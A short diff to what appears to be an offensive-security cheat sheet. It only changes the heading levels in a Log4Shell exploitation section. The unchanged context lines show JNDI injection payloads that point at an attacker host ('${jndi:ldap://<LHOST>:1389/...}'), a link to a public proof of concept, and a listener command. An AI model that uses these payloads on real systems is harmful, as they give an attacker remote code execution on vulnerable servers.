@@ -4664,7 +4664,7 @@ ${jndi:ldap://<LHOST>:1389/ci1dfd}
 
 > https://github.com/kozmer/log4j-shell-poc
 
-##### Pre-requisistes
+###### Pre-requisistes
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
@@ -4672,13 +4672,13 @@ ${jndi:ldap://<LHOST>:1389/ci1dfd}
 tar -xvf jdk-8u20-linux-x64.tar.gz
 ```
 
-##### Start the Listener
+###### Start the Listener
 
 ```c
 python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
 ```
 
-##### Execution
+###### Execution
 
 ```c
 ${jndi:ldap://<LHOST>:1389/foobar}
